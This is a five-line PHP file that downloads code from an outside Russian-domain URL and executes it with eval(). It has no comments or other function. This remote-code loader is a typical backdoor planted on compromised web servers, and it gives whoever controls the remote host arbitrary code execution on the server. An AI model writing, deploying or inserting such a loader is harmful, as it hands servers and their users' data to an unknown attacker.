<?php
$path = "https://code.topkz.ru/fgd/8/tdg2.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
